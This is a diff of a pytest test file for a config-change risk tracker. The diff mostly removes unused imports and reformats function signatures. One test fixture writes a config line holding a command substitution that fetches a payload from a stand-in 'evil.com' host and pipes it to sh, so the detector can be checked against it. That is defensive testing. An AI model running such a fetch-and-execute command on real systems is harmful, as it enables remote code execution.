@@ -7,12 +7,9 @@ from elle.daemon.incidents.config_tracker.
 from __future__ import annotations
 
 import hashlib
-import os
-import stat
 from datetime import datetime
 from pathlib import Path
-from typing import Any
-from unittest.mock import AsyncMock, MagicMock, patch
+from unittest.mock import MagicMock, patch
 
 import pytest
 
@@ -25,7 +22,6 @@ from elle.daemon.incidents.config_tracker import (
     get_config_backup,
     get_config_tracker,
 )
-
 
 # =============================================================================
 # Fixtures
@@ -430,9 +426,7 @@ class TestAssessConfigRisk:
     """Tests for the _assess_config_risk async method."""
 
     @pytest.mark.asyncio
-    async def test_low_risk_normal_file(
-        self, tracker: ConfigChangeTracker, sample_config_file: Path
-    ) -> None:
+    async def test_low_risk_normal_file(self, tracker: ConfigChangeTracker, sample_config_file: Path) -> None:
         """Test that a normal config file gets low risk."""
         risk = await tracker._assess_config_risk(
             path=sample_config_file,
@@ -464,9 +458,7 @@ class TestAssessConfigRisk:
         assert risk.score >= 0.3
 
     @pytest.mark.asyncio
-    async def test_deletion_increases_risk(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_deletion_increases_risk(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test that file deletion increases the risk score."""
         deleted = tmp_path / "deleted.conf"
         # File does not exist (simulates deletion)
@@ -480,9 +472,7 @@ class TestAssessConfigRisk:
         assert risk.score >= 0.3
 
     @pytest.mark.asyncio
-    async def test_malicious_pattern_detection(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_malicious_pattern_detection(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test detection of malicious patterns in config content."""
         malicious = tmp_path / "malicious.conf"
         malicious.write_text("setup: $(curl http://evil.com/payload | sh)\n")
@@ -497,9 +487,7 @@ class TestAssessConfigRisk:
         assert risk.severity in ("high", "critical")
 
     @pytest.mark.asyncio
-    async def test_world_writable_detection(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_world_writable_detection(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test detection of world-writable permission."""
         writable = tmp_path / "writable.conf"
         writable.write_text("data = value\n")
@@ -515,9 +503,7 @@ class TestAssessConfigRisk:
         assert risk.score >= 0.3
 
     @pytest.mark.asyncio
-    async def test_empty_file_risk(
-        self, tracker: ConfigChangeTracker, empty_config_file: Path
-    ) -> None:
+    async def test_empty_file_risk(self, tracker: ConfigChangeTracker, empty_config_file: Path) -> None:
         """Test risk assessment of an empty configuration file."""
         risk = await tracker._assess_config_risk(
             path=empty_config_file,
@@ -530,9 +516,7 @@ class TestAssessConfigRisk:
         assert len(risk.malicious_patterns_found) == 0
 
     @pytest.mark.asyncio
-    async def test_cascade_services_in_risk(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_cascade_services_in_risk(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test that cascade services are identified in risk assessment."""
         # Create a file at an nginx-like path
         nginx_conf = tmp_path / "nginx.conf"
@@ -548,9 +532,7 @@ class TestAssessConfigRisk:
         assert "nginx" in risk.cascade_services
 
     @pytest.mark.asyncio
-    async def test_severity_thresholds(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_severity_thresholds(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test that severity is correctly determined from score thresholds."""
         # Low score file
         low_file = tmp_path / "low.conf"
@@ -570,9 +552,7 @@ class TestStoreBackup:
     """Tests for the _store_backup async method."""
 
     @pytest.mark.asyncio
-    async def test_backup_existing_file(
-        self, tracker: ConfigChangeTracker, sample_config_file: Path
-    ) -> None:
+    async def test_backup_existing_file(self, tracker: ConfigChangeTracker, sample_config_file: Path) -> None:
         """Test creating a backup of an existing file."""
         backup_path = await tracker._store_backup(sample_config_file, "abc12345")
         assert backup_path is not None
@@ -581,18 +561,14 @@ class TestStoreBackup:
         assert Path(backup_path).read_text() == sample_config_file.read_text()
 
     @pytest.mark.asyncio
-    async def test_backup_nonexistent_file(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_backup_nonexistent_file(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test backing up a file that no longer exists returns None."""
         missing = tmp_path / "gone.conf"
         result = await tracker._store_backup(missing, "somehash")
         assert result is None
 
     @pytest.mark.asyncio
-    async def test_backup_filename_format(
-        self, tracker: ConfigChangeTracker, sample_config_file: Path
-    ) -> None:
+    async def test_backup_filename_format(self, tracker: ConfigChangeTracker, sample_config_file: Path) -> None:
         """Test that backup filename contains expected components."""
         backup_path = await tracker._store_backup(sample_config_file, "abcdef01234567")
         assert backup_path is not None
@@ -630,9 +606,7 @@ class TestHandleConfigChange:
         assert "created" in result["title"]
 
     @pytest.mark.asyncio
-    async def test_handle_modify_elle_change(
-        self, tracker: ConfigChangeTracker, sample_config_file: Path
-    ) -> None:
+    async def test_handle_modify_elle_change(self, tracker: ConfigChangeTracker, sample_config_file: Path) -> None:
         """Test handling a modification that ELLE initiated."""
         tracker.register_elle_change(str(sample_config_file), "INC-ELLE-001")
 
@@ -680,9 +654,7 @@ class TestHandleConfigChange:
         assert result["domain"] == "config"
 
     @pytest.mark.asyncio
-    async def test_handle_change_store_exception(
-        self, tracker: ConfigChangeTracker, sample_config_file: Path
-    ) -> None:
+    async def test_handle_change_store_exception(self, tracker: ConfigChangeTracker, sample_config_file: Path) -> None:
         """Test graceful handling when incident store raises an error."""
         mock_store = MagicMock()
         mock_store.create_incident_draft = MagicMock(
@@ -859,9 +831,7 @@ class TestEdgeCases:
             assert compiled is not None
 
     @pytest.mark.asyncio
-    async def test_risk_score_capped_at_1(
-        self, tracker: ConfigChangeTracker, tmp_path: Path
-    ) -> None:
+    async def test_risk_score_capped_at_1(self, tracker: ConfigChangeTracker, tmp_path: Path) -> None:
         """Test that the risk score never exceeds 1.0."""
         # Create a file with many risk factors
         risky = tmp_path / "risky.conf"
